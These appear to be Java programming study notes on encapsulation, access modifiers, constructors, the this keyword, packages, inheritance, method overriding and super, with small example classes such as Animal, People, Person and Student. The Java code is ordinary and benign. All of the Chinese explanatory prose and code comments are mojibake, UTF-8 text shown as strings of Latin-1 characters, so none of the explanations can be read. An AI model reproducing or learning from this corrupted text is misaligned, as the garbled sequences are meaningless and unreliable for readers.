å°è£…æ€§éšè—å¯¹è±¡å†…éƒ¨çš„å¤æ‚æ€§ï¼Œåªå¯¹å¤–å…¬å¼€ç®€å•çš„æ¥å£ã€‚ä¾¿äºå¤–ç•Œè°ƒç”¨ï¼Œä»è€Œæé«˜ç³»ç»Ÿçš„å¯æ‰©å±•æ€§ã€å¯ç»´æŠ¤æ€§ã€‚é€šä¿—çš„è¯´ï¼ŒæŠŠè¯¥éšè—çš„éšè—èµ·æ¥ï¼Œè¯¥æš´éœ²çš„æš´éœ²å‡ºæ¥ã€‚è¿™å°±æ˜¯å°è£…æ€§çš„è®¾è®¡æ€æƒ³ã€‚ å°è£…æ€§ä¸éšè—ï¼š åœ¨å¯¹å¯¹è±¡å‘å±æ€§è¿›è¡Œèµ‹å€¼æ—¶ï¼Œèµ‹å€¼æ“ä½œè¦å—åˆ°æ•°æ®ç±»å‹å’Œå­˜å‚¨èŒƒå›´çš„åˆ¶çº¦ã€‚é™¤æ­¤ä¹‹å¤–æ²¡æœ‰å…¶ä»–åˆ¶çº¦æ¡ä»¶ã€‚ä½†æ˜¯ï¼Œåœ¨å®é™…é—®é¢˜ä¸­ï¼Œæˆ‘ä»¬å¾€å¾€éœ€è¦ç»™å±æ€§èµ‹å€¼ *åŠ å…¥é¢å¤–çš„é™åˆ¶æ¡ä»¶ï¼Œè¿™ä¸ªæ¡ä»¶å°±ä¸èƒ½å†å±æ€§å£°æ˜æ—¶å€™ä½“ç°ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡æ–¹æ³•è¿›è¡Œé™åˆ¶æ¡ä»¶çš„æ·»åŠ ã€‚ * åŒæ—¶æˆ‘ä»¬éœ€è¦é¿å…ç”¨æˆ·å†ä½¿ç”¨"å¯¹è±¡.å±æ€§"æ–¹å¼è¿›è¡Œèµ‹å€¼ï¼Œåˆ™éœ€è¦å°†å±æ€§å£°æ˜ä¸ºprivate * -->æ­¤æ—¶é’ˆå¯¹å±æ€§ï¼Œå°±ä½“ç°äº†å°è£…æ€§ å°è£…æ€§ä½“ç°ï¼š 1.æˆ‘ä»¬å°†ç±»çš„å±æ€§ç§æœ‰åŒ–(private),åŒæ—¶ï¼Œæä¾›å…¬å…±çš„(public)æ–¹æ³•æ¥è·å–(getXXX)å’Œè®¾ç½®(setXXX)æ­¤å±æ€§çš„å€¼ 2.ä¸å¯¹å¤–æš´éœ²ç§æœ‰æ–¹æ³• 3.å•ä¾‹æ¨¡å¼ 4. ... ... æƒé™ä¿®é¥°ç¬¦ï¼š * å°è£…æ€§çš„ä½“ç°éœ€è¦æƒé™ä¿®é¥°ç¬¦æ¥é…åˆï¼š * 1.javaè§„å®šçš„å››ç§æƒé™(ä»å°åˆ°å¤§æ’åº)ï¼šprivateã€ç¼ºçœ(å³defaultï¼Œä¸ç”¨å†™çš„æ—¶å€™)ã€protectedã€public * è¯¦ç»†è§ç¬”è®° * 2.å››ç§æƒé™å¯ä»¥ç”¨æ¥ä¿®é¥°ç±»åŠç±»çš„å†…éƒ¨ç»“æ„ï¼šå±æ€§ã€æ–¹æ³•ã€æ„é€ å™¨ã€å†…éƒ¨ç±» * 3.å…·ä½“çš„ï¼Œå››ç§æƒé™éƒ½å¯ä»¥ç”¨æ¥ä¿®é¥°å†…éƒ¨ç»“æ„ï¼šå±æ€§ã€æ–¹æ³•ã€æ„é€ å™¨ã€å†…éƒ¨ç±» * ä¿®é¥°ç±»çš„è¯ï¼šåªèƒ½ç”¨public å’Œ ç¼ºçœ å°è£…æ€§æ€»ç»“ï¼š Javaæä¾›äº†4ç§æƒé™ä¿®é¥°ç¬¦æ¥ä¿®é¥°ç±»åŠç±»çš„å†…éƒ¨ç»“æ„ï¼Œä½“ç°ç±»åŠç±»çš„å†…éƒ¨ç»“æ„åœ¨è¢«è°ƒç”¨æ—¶çš„å¯è§æ€§çš„å¤§å°ã€‚ public class AnimalTest { public static void main(String[] args) { Animal a = new Animal(); //a.name = "å¤§é»„"; //a.age = 2; //a.legs = 4; //ç¦æ­¢ç”¨æˆ·ç›´æ¥è®¿é—®å±æ€§(æƒé™ä¿®é¥°ç¬¦ private)ï¼Œè®©ä»–è®¿é—®setLegs() //a.legs = -4; // è´Ÿæ•°è‚¯å®šæ˜¯ä¸ç¬¦åˆå®é™…çš„ï¼Œåº”è¯¥åŠ é™åˆ¶åªè®©è¾“å…¥æ­£å¶æ•° a.setName("å¤§é»„"); a.setAge(2); a.setLegs(6); a.show(); // æµ‹è¯•æƒé™ OrderTest o1 = new OrderTest(); o1.b = 111; o1.c = 222; // o1.a è°ƒä¸äº†äº†(å‡ºäº†ç±»ï¼Œç§æœ‰å±æ€§å’Œæ–¹æ³•å°±ä¸èƒ½è¢«è°ƒç”¨) o1.test2(); o1.test3(); // o1.test1(); è°ƒä¸äº† } } class Animal{ private String name; private int age; private int legs; //è…¿ä¸ªæ•°, ç§æœ‰çš„ï¼Œç¦æ­¢æš´éœ²åœ¨å¤–é¢ //å¯¹å±æ€§çš„è®¾ç½® // set, æŠŠå¤„ç†é€»è¾‘å¸è½½é‡Œé¢å°è£…èµ·æ¥ public void setLegs(int l) { if(l >= 0 &amp;&amp; l % 2 == 0) { legs = l; }else { legs = 0; } } //å¯¹å±æ€§çš„è·å–ï¼šgetæ–¹æ³•, è¿”å›å±æ€§å€¼ public int getLegs() { return legs; } public void setAge(int a){ if(a >= 0) { age = a; }else { age = 0; } } public int getAge() { return age; } public void setName(String n){ name = n; } public String getName() { return name; } public void eat() { System.out.println("åŠ¨ç‰©è¿›é£Ÿ"); } public void show() { System.out.println("åŠ¨ç‰©çš„åå­—" + name + "ï¼Œå¹´é¾„ï¼š" + age + "ï¼Œè…¿ä¸ªæ•°ï¼š" + legs); } } æƒé™æµ‹è¯•ä¾‹å­ï¼š public class OrderTest2 { // ä¸åŒåŒ…ä¸‹ï¼Œå¯ä»¥èµ·åŒåçš„ç±» public static void main(String[] args) { // æµ‹è¯•æƒé™ // å‡ºäº†Orderç±»æ‰€å±çš„åŒ…ä¹‹åï¼Œç§æœ‰ã€ç¼ºçœçš„ç»“æ„éƒ½ä¸å¯ä»¥è°ƒç”¨äº† OrderTest o1 = new OrderTest(); //o1.b = 111; // ç¼ºçœçš„ä¹Ÿè°ƒç”¨ä¸äº†äº† o1.c = 222; // o1.a è°ƒä¸äº†äº†(å‡ºäº†ç±»ï¼Œç§æœ‰å±æ€§å’Œæ–¹æ³•å°±ä¸èƒ½è¢«è°ƒç”¨) //o1.test2(); o1.test3(); // o1.test1(); è°ƒä¸äº† } } æ„é€ å™¨ç‰¹å¾ï¼š å®ƒå…·æœ‰ä¸ç±»ç›¸åŒçš„åç§° å®ƒä¸å£°æ˜è¿”å›å€¼ç±»å‹(ä¸å£°æ˜ä¸ºvoidä¸åŒ) ä¸èƒ½è¢«staticã€finalã€synchronizedã€abstractã€nativeä¿®é¥°ï¼Œä¸èƒ½æœ‰returnè¯­å¥è¿”å›å€¼ ä½œç”¨ï¼šåˆ›å»ºå¯¹è±¡ï¼Œåˆå§‹åŒ–å¯¹è±¡çš„å±æ€§ æ³¨æ„ï¼š å¦‚æœæ²¡æœ‰æ˜¾å¼çš„å®šä¹‰ç±»æ„é€ å™¨çš„è¯ï¼Œåˆ™ç³»ç»Ÿé»˜è®¤æä¾›ä¸€ä¸ªç©ºå‚çš„æ„é€ å™¨ å®šä¹‰æ„é€ å™¨çš„æ ¼å¼ï¼šæƒé™ä¿®é¥°ç¬¦ ç±»å(å½¢å‚åˆ—è¡¨){} æ„é€ å™¨ ä¸æ˜¯æ–¹æ³• ä¸€ä¸ªç±»ä¸­å®šä¹‰å¤šä¸ªæ„é€ å™¨æ„æˆé‡è½½ ä¸€æ—¦æ˜¾å¼çš„å®šä¹‰ç±»çš„æ„é€ å™¨ï¼Œç³»ç»Ÿå°±ä¸å†æä¾›é»˜è®¤çš„ç©ºå‚æ„é€ å™¨ ä¸€ä¸ªç±»ä¸­ï¼Œè‡³å°‘ä¼šæœ‰ä¸€ä¸ªæ„é€ å™¨ å¦‚ä¸‹ï¼š public class PeopleTest { public static void main(String[] args) { // åˆ›å»ºç±»å¯¹è±¡ People p = new People("Tom", 18); //å½¢å‚åœ¨åˆ›å»ºå¯¹è±¡æ—¶å€™å°±èµ‹å€¼äº†å±æ€§ p.walk(); } } class People{ String name; int age; // æ„é€ å™¨ public People(){ System.out.println("æ„é€ å™¨1è¢«è°ƒç”¨..."); } // æ„é€ å™¨çš„é‡è½½ public People(String n){ System.out.println("æ„é€ å™¨1è¢«è°ƒç”¨..."); name = n; //å½¢å‚åœ¨åˆ›å»ºå¯¹è±¡æ—¶å€™å°±èµ‹å€¼äº†å±æ€§ } public People(String n, int a){ System.out.println("æ„é€ å™¨1è¢«è°ƒç”¨..."); name = n; //å½¢å‚åœ¨åˆ›å»ºå¯¹è±¡æ—¶å€™å°±èµ‹å€¼äº†å±æ€§ age = a; } public void walk() { System.out.println("äººèµ°è·¯..."); } } æ€»ç»“-å±æ€§èµ‹å€¼è¿‡ç¨‹(æŒ‰ä¼˜å…ˆé¡ºåº)ï¼š é»˜è®¤åˆå§‹åŒ– æ˜¾å¼åˆå§‹åŒ– æ„é€ å™¨ä¸­åˆå§‹åŒ– é€šè¿‡å¯¹è±¡.å±æ€§æˆ–å¯¹è±¡.æ–¹æ³•çš„æ–¹å¼èµ‹å€¼ JavaBeanJavaBeanï¼šæ˜¯ä¸€ç§Javaè¯­è¨€å†™æˆçš„å¯é‡ç”¨ç»„ä»¶ã€‚ æ‰€è°“javaBeanï¼Œæ˜¯æŒ‡ç¬¦åˆå¦‚ä¸‹æ ‡å‡†çš„Javaç±»: ç±»æ˜¯å…¬å…±(public)çš„ æœ‰ä¸€ä¸ªæ— å‚çš„å…¬å…±çš„æ„é€ å™¨ æœ‰å±æ€§ï¼Œä¸”æœ‰å¯¹åº”çš„getXXXã€setXXXæ–¹æ³• æ»¡è¶³è¿™æ ·ä¸‰ä¸ªæ¡ä»¶çš„ä¸€ä¸ªç±»ï¼Œå°±å«JavaBean ä¹Ÿå¯ä»¥é€šè¿‡åå°„æ¥é€ å¯¹è±¡ UMLç±»å›¾ thiså…³é”®å­— thisè¡¨ç¤ºå½“å‰å¯¹è±¡ï¼Œå¯ä»¥è°ƒç”¨ç±»çš„å±æ€§ã€æ–¹æ³•å’Œæ„é€ å™¨ å®ƒåœ¨æ–¹æ³•å†…éƒ¨ä½¿ç”¨ï¼Œå³è¿™ä¸ªæ–¹æ³•æ‰€å±å¯¹è±¡çš„å¼•ç”¨ å®ƒåœ¨æ„é€ å™¨å†…éƒ¨ä½¿ç”¨ï¼Œè¡¨ç¤ºè¯¥æ„é€ å™¨æ­£åœ¨åˆå§‹åŒ–çš„å¯¹è±¡ package cn.xpshuai.www; /* * thiså…³é”®å­— * * thisä¿®é¥°å±æ€§å’Œæ–¹æ³• * thisç†è§£ä¸ºï¼šå½“å‰å¯¹è±¡ æˆ– å½“å‰æ­£åœ¨åˆ›å»ºçš„å¯¹è±¡(æ„é€ å™¨ä¸­) * * ã€åœ¨ç±»çš„æ–¹æ³•ä¸­ã€‘ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨"this.å±æ€§"æˆ–"this.æ–¹æ³•"çš„æ–¹å¼ï¼Œè°ƒç”¨å½“å‰å¯¹è±¡å±æ€§æˆ–æ–¹æ³•ã€‚ä½†æ˜¯,é€šå¸¸æƒ…å†µä¸‹,æˆ‘ä»¬éƒ½é€‰æ‹©çœç•¥"this."ã€‚ * ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œå¦‚æœæ–¹æ³•çš„å½¢å‚å’Œç±»çš„å±æ€§åŒåæ—¶ï¼Œæˆ‘ä»¬å¿…é¡»æ˜¾å¼ä½¿ç”¨"this.å˜é‡"çš„æ–¹å¼ï¼Œæ¥è¡¨åæ¬¡å˜é‡æ˜¯å±æ€§è€Œéå½¢å‚ * åŒæ ·ï¼Œã€åœ¨æ„é€ å™¨ä¸­ã€‘ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨"this.å±æ€§"æˆ–"this.æ–¹æ³•"çš„æ–¹å¼ï¼Œè°ƒç”¨å½“å‰æ­£åœ¨åˆ›å»ºçš„å¯¹è±¡å±æ€§æˆ–æ–¹æ³•ã€‚ä½†æ˜¯,é€šå¸¸æƒ…å†µä¸‹,æˆ‘ä»¬éƒ½é€‰æ‹©çœç•¥"this."ã€‚I * ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œå¦‚æœæ–¹æ³•çš„å½¢å‚å’Œç±»çš„å±æ€§åŒåæ—¶ï¼Œæˆ‘ä»¬å¿…é¡»æ˜¾å¼ä½¿ç”¨"this.å˜é‡"çš„æ–¹å¼ï¼Œæ¥è¡¨åæ¬¡å˜é‡æ˜¯å±æ€§è€Œéå½¢å‚ * * * * ã€thisè°ƒç”¨æ„é€ å™¨ã€‘ * 1.æˆ‘ä»¬åœ¨ç±»çš„æ„é€ å™¨ä¸­ï¼Œå¯ä»¥ä½¿ç”¨æ˜¾å¼çš„ä½¿ç”¨"this(å½¢å‚åˆ—è¡¨);"æ–¹å¼ï¼Œè°ƒç”¨æœ¬ç±»ä¸­å…¶ä»–çš„æ„é€ å™¨ * 2.æ„é€ å™¨ä¸­ä¸èƒ½ä½¿ç”¨"this(å½¢å‚åˆ—è¡¨);"æ–¹å¼è°ƒç”¨è‡ªå·± * 3.å¦‚æœä¸€ä¸ªç±»ä¸­æœ‰nå’Œæ„é€ å™¨ï¼Œåˆ™æœ€å¤šæœ‰n-1ä¸ªæ„é€ å™¨ä¸­ä½¿ç”¨äº†"this(å½¢å‚åˆ—è¡¨);" * 4."this(å½¢å‚åˆ—è¡¨);"å¿…é¡»å£°æ˜åœ¨å½“å‰æ„é€ å™¨çš„é¦–è¡Œ * 5.æ„é€ å™¨å†…éƒ¨ä¸èƒ½åŒæ—¶è°ƒç”¨ä¸¤ä¸ª"this(å½¢å‚åˆ—è¡¨);" * */ public class ThisTEst { public static void main(String[] args) { People2 p1 = new People2("Tom", 12); System.out.println(p1.getAge()); } } class People2{ String name; int age; // æ„é€ å™¨ï¼ˆå¦‚æœå†™ä¸‹é¢çš„å¸¦å‚æ•°çš„æ„é€ å™¨ï¼Œå¿…é¡»å…ˆå†™ä¸Šç©ºçš„æ„é€ å™¨ï¼‰ public People2(){ System.out.println("æ„é€ å™¨1è¢«è°ƒç”¨..."); this.eat(); // ä½¿ç”¨thisè°ƒç”¨æ–¹æ³• } public People2(String name){ this(); //è°ƒç”¨ä¸Šé¢çš„æ„é€ å™¨1 System.out.println("æ„é€ å™¨2è¢«è°ƒç”¨..."); this.name = name; } public People2(String name, int age){ this(name); //è°ƒç”¨ä¸Šé¢çš„æ„é€ å™¨2ï¼Œæ–¹å¼å†—ä½™ // this.name = name; // é‚£ä¹ˆä¸‹é¢å°±ä¸éœ€è¦è¿™è¡Œçš„nameäº† this.age = age; System.out.println("æ„é€ å™¨3è¢«è°ƒç”¨..."); } //set public void setName(String name) { this.name = name; //ä½¿ç”¨this(å½“å‰å¯¹è±¡)åŒºåˆ†ï¼šå½“å‰å¯¹è±¡çš„name=name } //get public String getName() { return this.name; } public void setAge(int age) { this.age = age; } public int getAge() { return this.age; } public void walk() { System.out.println("äººèµ°è·¯..."); } } Eclipseå¿«é€Ÿç”Ÿæˆgetå’Œsetç­‰æ–¹æ³•ï¼šalt + seift +så¿«æ·é”®å°±å¯ä»¥çœ‹åˆ°å•¦ Eclipseå¿«é€Ÿç”Ÿæˆgetå’Œsetç­‰æ–¹æ³•ï¼šalt +insertå¿«æ·é”®å°±å¯ä»¥çœ‹åˆ°å•¦ package * packageå…³é”®å­—çš„ä½¿ç”¨ï¼š * 1.ä¸ºäº†å®ç°æ›´å¥½é¡¹ç›®ä¸­ç±»çš„ç®¡ç†ï¼Œæå‡ºäº†â€œåŒ…â€çš„æ¦‚å¿µ * 2.ä½¿ç”¨packageå£°æ˜ç±»æˆ–è€…æ¥å£æ‰€å±çš„åŒ…ï¼Œå£°æ˜åœ¨æºæ–‡ä»¶çš„é¦–è¡Œ * 3.åŒ…ï¼Œå±äºæ ‡è¯†ç¬¦ï¼Œéµå¾ªæ ‡è¯†ç¬¦å‘½åè§„èŒƒ(å°å†™)ã€è§åçŸ¥æ„ * 4.æ¯"."ä¸€æ¬¡ï¼Œå°±ä»£è¡¨ä¸€å±‚æ–‡ä»¶ç›®å½• * * è¡¥å……ï¼šåŒä¸€ä¸ªåŒ…ä¸‹ï¼Œä¸èƒ½å‘½ååŒåçš„æ¥å£ã€ç±», ä¸åŒåŒ…ä¸‹å¯ä»¥å‘½ååŒåçš„æ¥å£ã€ç±» ç»§æ‰¿æ€§ Javaåªæ”¯æŒå•ç»§æ‰¿å’Œå¤šå±‚ç»§æ‰¿ï¼Œä¸å…è®¸å¤šé‡ç»§æ‰¿ Objectç±»æ˜¯æ‰€æœ‰ç±»çš„æ ¹çˆ¶ç±» ç®€å•ä¾‹å­å¦‚ä¸‹ï¼š æµ‹è¯•ç±»ï¼š package cn.xpshuai.java; /* * ç»§æ‰¿å¥½å¤„ï¼š * 1.å‡å°‘ä»£ç å†—ä½™ï¼Œæé«˜ä»£ç å¤ç”¨ * 2.ä¾¿äºåŠŸèƒ½æ‹“å±• * 3.ä¸ºäº†ä»¥åå¤šæ€ä½¿ç”¨ï¼Œæä¾›äº†å‰æ * * æ ¼å¼ï¼š class A extends B{} * A:å­ç±»ã€æ´¾ç”Ÿç±»ã€subclass * Bï¼šçˆ¶ç±»ã€è¶…ç±»ã€åŸºç±»ã€superclass * * ä½“ç°ï¼šä¸€æ—¦å­ç±»Aç»§æ‰¿çˆ¶ç±»Bä»¥åï¼Œå­ç±»Aä¸­å°±è·å–äº†çˆ¶ç±»Bä¸­å£°æ˜çš„æ‰€æœ‰çš„ å±æ€§ã€æ–¹æ³• * ç‰¹åˆ«çš„ï¼Œçˆ¶ç±»ä¸­å£°æ˜ä¸ºç§æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼Œå­ç±»ä»è·å–åˆ°äº†ï¼Œåªæ˜¯ç”±äºå°è£…æ€§å½±å“-->ä½¿å¾—å­ç±»ä¸èƒ½ç›´æ¥è°ƒç”¨è€Œå·² * * å­ç±»ç»§æ‰¿çˆ¶ç±»ä»¥åï¼Œè¿˜å¯ä»¥å£°æ˜è‡ªå·±ç‰¹æœ‰çš„å±æ€§æˆ–æ–¹æ³•:å®ç°åŠŸèƒ½çš„æ‹“å±•ã€‚ * * * * è§„å®šï¼š * 1.ä¸€ä¸ªç±»åªèƒ½æœ‰ä¸€ä¸ªçˆ¶ç±» * 2.Javaåªæ”¯æŒå•ç»§æ‰¿å’Œå¤šå±‚ç»§æ‰¿ * 3.ç›´æ¥çˆ¶ç±»ã€é—´æ¥çˆ¶ç±»ã€‚å­ç±»ç»§æ‰¿çˆ¶ç±»ä»¥åï¼Œå°±è·å–äº†ç›´æ¥çˆ¶ç±»ä»¥åŠæ‰€æœ‰é—´æ¥çˆ¶ç±»ä¸­å£°æ˜çš„å±æ€§å’Œæ–¹æ³• * * * å¦‚æœæˆ‘ä»¬æ²¡æœ‰æ˜¾å¼çš„å£°æ˜ä¸€ä¸ªç±»çš„çˆ¶ç±»çš„è¯ï¼Œåˆ™æ­¤ç±»ç»§æ‰¿äºjava.lang.Objectç±» * æ‰€æœ‰çš„Javaç±»ï¼Œéƒ½ç›´æ¥æˆ–é—´æ¥çš„ç»§æ‰¿Objectç±» */ public class ExtendsTest { public static void main(String[] args) { Person p1 = new Person("å¼ ä¸‰", 18); p1.eat(); Student s1 = new Student("GIS"); s1.setName("å¼ ä¸‰ä¸‰"); s1.setAge(22); // çˆ¶ç±»ä¸­çš„æ–¹æ³•ï¼Œå­ç±»ä¸­ä¹Ÿå¯ä»¥è°ƒç”¨ æ¥å®ç°å¤ç”¨ s1.show(); // System.out.println(s1.getMajor()); } } çˆ¶ç±»ï¼š package cn.xpshuai.java; public class Person { private String name; //ç§æœ‰çš„ä¹Ÿç»§æ‰¿åˆ°äº†ï¼Œé€šè¿‡getXXXæ–¹æ³•æ¥è·å– private int age; public Person() { } public Person(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public void eat() { System.out.println("åƒ"); } public void sleep() { System.out.println("ç¡è§‰"); } } å­ç±»ï¼š public class Student extends Person{ // extends Person ï¼šè¡¨ç¤ºç»§æ‰¿Personç±» private String major; //æ„é€ æ–¹æ³• public Student() { super(); } public Student(String major) { super(); this.major = major; } // get public String getMajor() { return major; } // set public void setMajor(String major) { this.major = major; } public void study() { System.out.println("å­¦ä¹ "); } public void show() { System.out.println("å§“åï¼š" + getName() + ", å¹´é¾„ï¼š" + getAge() + "ï¼Œä¸“ä¸šï¼š" + getMajor()); } //é‡å†™çˆ¶ç±»æ–¹æ³• @Override public void eat() { System.out.println("å­¦ç”Ÿåº”è¯¥å¤šåƒ"); } } æ–¹æ³•çš„é‡å†™(override ã€ overwrite) ä¸å‰é¢çš„â€é‡è½½â€åŒºåˆ† å®šä¹‰ï¼šåœ¨å­ç±»ä¸­å¯ä»¥æ ¹æ®éœ€è¦å¯¹ä»çˆ¶ç±»ä¸­ç»§æ‰¿æ¥çš„æ–¹æ³•è¿›è¡Œæ”¹é€ ï¼Œä¹Ÿç§°ä¸ºæ–¹æ³•çš„é‡ç½®ã€è¦†ç›–ã€‚åœ¨ç¨‹åºæ‰§è¡Œæ—¶ï¼Œå­ç±»çš„æ–¹æ³•å°†è¦†ç›–çˆ¶ç±»çš„æ–¹æ³•ï¼ˆå­ç±»æ ¹æ®éœ€è¦å¯¹ä»çˆ¶ç±»ç»§æ‰¿æ¥çš„æ–¹æ³•è¿›è¡Œæ”¹é€ ï¼‰ã€‚ è¦æ±‚ï¼š å­ç±»é‡å†™çš„æ–¹æ³•å¿…é¡»å’Œçˆ¶ç±»è¢«é‡å†™çš„æ–¹æ³•å…·æœ‰ç›¸åŒçš„æ–¹æ³•åç§°ã€å‚æ•°åˆ—è¡¨ å­ç±»é‡å†™çš„æ–¹æ³•çš„è¿”å›å€¼ç±»å‹ä¸èƒ½å¤§äºçˆ¶ç±»è¢«é‡å†™çš„æ–¹æ³•çš„è¿”å›å€¼ç±»å‹ å­ç±»é‡å†™çš„æ–¹æ³•ä½¿ç”¨çš„è®¿é—®æƒé™ä¸èƒ½å°äºçˆ¶ç±»è¢«é‡å†™çš„æ–¹æ³•çš„è®¿é—®æƒé™ å­ç±»ä¸èƒ½é‡å†™çˆ¶ç±»ä¸­å£°æ˜ä¸ºprivateæƒé™çš„æ–¹æ³• å­ç±»æ–¹æ³•æŠ›å‡ºçš„å¼‚å¸¸ä¸èƒ½å¤§äºçˆ¶ç±»è¢«é‡å†™æ–¹æ³•çš„å¼‚å¸¸ æ³¨æ„ï¼š å­ç±»ä¸çˆ¶ç±»ä¸­åŒååŒå‚æ•°çš„æ–¹æ³•å¿…é¡»åŒæ—¶å£°æ˜ä¸ºéstaticçš„(å³ä¸ºé‡å†™) è‹¥åŒæ—¶å£°æ˜ä¸ºstaticçš„ã€ˆä¸å«é‡å†™ï¼‰ï¼Œå› ä¸ºstaticæ–¹æ³•æ˜¯å±äºç±»çš„ï¼Œå­ç±»æ— æ³•è¦†ç›–çˆ¶ç±»çš„æ–¹æ³•ã€‚ * ã€é‡å†™ã€‘override ã€ overwrite * å­ç±»æ ¹æ®éœ€è¦å¯¹ä»çˆ¶ç±»ç»§æ‰¿æ¥çš„æ–¹æ³•è¿›è¡Œæ”¹é€  * * å½¢å¼ï¼šæƒé™ä¿®é¥°ç¬¦ (å¯é€‰ï¼šstatic/final) è¿”å›å€¼ç±»å‹ æ–¹æ³•å(å½¢å‚åˆ—è¡¨) throws å¼‚å¸¸çš„ç±»å‹{ * //æ–¹æ³•ä½“ * } * * 1.å¿…é¡»ä¸çˆ¶ç±»è¢«é‡å†™çš„æ–¹æ³•å…·æœ‰â€œç›¸åŒçš„æ–¹æ³•åç§°ã€å‚æ•°åˆ—è¡¨â€ * 2.å­ç±»é‡å†™çš„æ–¹æ³•çš„è¿”å›å€¼ç±»å‹â€œä¸èƒ½å¤§äºâ€çˆ¶ç±»è¢«é‡å†™çš„æ–¹æ³•çš„è¿”å›å€¼ * >çˆ¶ç±»è¢«é‡å†™çš„æ–¹æ³•çš„è¿”å›å€¼ç±»å‹æ˜¯voidï¼Œåˆ™å­ç±»é‡å†™çš„æ–¹æ³•çš„è¿”å›å€¼ç±»å‹åªèƒ½æ˜¯void * >çˆ¶ç±»è¢«é‡å†™çš„æ–¹æ³•çš„è¿”å›å€¼ç±»å‹æ˜¯Aç±»å‹ï¼Œåˆ™å­ç±»é‡å†™çš„æ–¹æ³•çš„è¿”å›å€¼ç±»å‹å¯ä»¥æ˜¯Aç±»æˆ–Aç±»çš„å­ç±» * >çˆ¶ç±»è¢«é‡å†™çš„æ–¹æ³•çš„è¿”å›å€¼ç±»å‹æ˜¯åŸº:æœ¬æ®ç±»å‹ï¼Œåˆ™å­ç±»é‡å†™çš„æ–¹æ³•çš„è¿”å›å€¼ç±»å‹å¿…é¡»æ˜¯ç›¸åŒçš„åŸºæœ¬æ•°æ®ç±»å‹ * 3.å­ç±»é‡å†™çš„æ–¹æ³•ä½¿ç”¨çš„å½“é—®æƒé™â€œä¸èƒ½å°äºâ€çˆ¶ç±»è¢«é‡å†™çš„æ–¹æ³•çš„è®¿é—®æƒé™ * >å­ç±»ä¸èƒ½é‡å†™çˆ¶ç±»ä¸­privateçš„æ–¹æ³• * 4.å­ç±»æ–¹æ³•æŠ›å‡ºçš„å¼‚å¸¸ä¸èƒ½å¤§äºçˆ¶ç±»è¢«é‡å†™æ–¹æ³•çš„å¼‚å¸¸ * > * * å­ç±»ä¸çˆ¶ç±»ä¸­åŒååŒå‚æ•°çš„æ–¹æ³•å¿…é¡»åŒæ—¶å£°æ˜ä¸ºéstaticçš„(å³ä¸ºé‡å†™)ï¼Œæˆ–è€…åŒæ—¶å£°æ˜ä¸ºstaticçš„ï¼ˆä¸æ˜¯é‡å†™ï¼‰ã€‚å› ä¸ºstaticæ–¹æ³•æ˜¯å±äºç±»çš„ï¼Œå­ç±»æ— æ³•è¦†ç›–çˆ¶ç±»çš„æ–¹æ³•ã€‚ * superå…³é”®å­— å­ç±»é‡å†™äº†çˆ¶ç±»çš„æ–¹æ³•ä¹‹åï¼Œå¯ä»¥ç”¨superè°ƒç”¨çˆ¶ç±»ä¸­çš„æ–¹æ³• superå¯ä»¥è°ƒç”¨ï¼šå±æ€§ã€æ–¹æ³•ã€æ„é€ å™¨ superè°ƒç”¨å±æ€§å’Œæ–¹æ³•ï¼š æˆ‘ä»¬å¯ä»¥åœ¨å­ç±»çš„æ–¹æ³•æˆ–æ„é€ å™¨ä¸­ã€‚é€šè¿‡ä½¿ç”¨super.å±æ€§æˆ–super.æ–¹æ³•çš„æ–¹å¼ï¼Œæ˜¾å¼çš„è°ƒç”¨çˆ¶ç±»ä¸­å£°æ˜çš„å±æ€§æˆ–æ–¹æ³•ã€‚ä½†æ˜¯ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¹ æƒ¯çœç•¥super. ç‰¹æ®Šæƒ…å†µ: å½“å­ç±»å’Œçˆ¶ç±»ä¸­å®šä¹‰äº†åŒåçš„å±æ€§æ—¶ï¼Œæˆ‘ä»¬è¦æƒ³åœ¨å­ç±»ä¸­è°ƒç”¨çˆ¶ç±»ä¸­å£°æ˜çš„å±æ€§ï¼Œåˆ™å¿…é¡»æ˜¾å¼çš„ä½¿ç”¨super.å±æ€§çš„æ–¹å¼ï¼Œè¡¨æ˜è°ƒç”¨çš„æ˜¯çˆ¶ç±»ä¸­å£°æ˜çš„å±æ€§ã€‚ ç‰¹æ®Šæƒ…å†µ: å½“å­ç±»é‡å†™äº†çˆ¶ç±»ä¸­çš„æ–¹æ³•ä»¥åï¼Œæˆ‘ä»¬æƒ³åœ¨å­ç±»çš„æ–¹æ³•ä¸­è°ƒç”¨çˆ¶ç±»ä¸­è¢«é‡å†™çš„æ–¹æ³•æ—¶ï¼Œåˆ™å¿…é¡»æ˜¾å¼çš„ä½¿ç”¨super.æ–¹æ³•çš„æ–¹å¼ï¼Œè¡¨æ˜è°ƒç”¨çš„æ˜¯çˆ¶ç±»ä¸­è¢«é‡å†™çš„æ–¹æ³•ã€‚ superè°ƒç”¨çˆ¶ç±»æ„é€ å™¨ï¼š æˆ‘ä»¬å¯ä»¥åœ¨å­ç±»çš„æ„é€ å™¨ä¸­æ˜¾å¼çš„ä½¿ç”¨super(å½¢å‚åˆ—è¡¨)çš„æ–¹å¼ï¼Œè°ƒç”¨çˆ¶ç±»ä¸­å£°æ˜çš„æŒ‡å®šçš„æ„é€ å™¨ super(å½¢å‚åˆ—è¡¨)çš„ä½¿ç”¨ï¼Œå¿…é¡»å£°æ˜åœ¨å­ç±»æ„é€ å™¨çš„é¦–è¡Œ! æˆ‘ä»¬åœ¨ç±»çš„æ„é€ å™¨ä¸­ï¼Œé’ˆå¯¹äºthis(å½¢å‚åˆ—è¡¨)æˆ–super(å½¢å‚åˆ—è¡¨)åªèƒ½äºŒé€‰ä¸€ï¼Œä¸èƒ½åŒæ—¶å‡ºç° åœ¨æ„é€ å™¨çš„é¦–è¡Œï¼Œæ²¡æœ‰æ˜¾å¼çš„å£°æ˜this(å½¢å‚åˆ—è¡¨)æˆ–super(å½¢å‚åˆ—è¡¨)ï¼Œåˆ™é»˜è®¤è°ƒç”¨çš„æ˜¯çˆ¶ç±»ä¸­ç©ºå‚çš„æ„é€ æ–¹æ³• 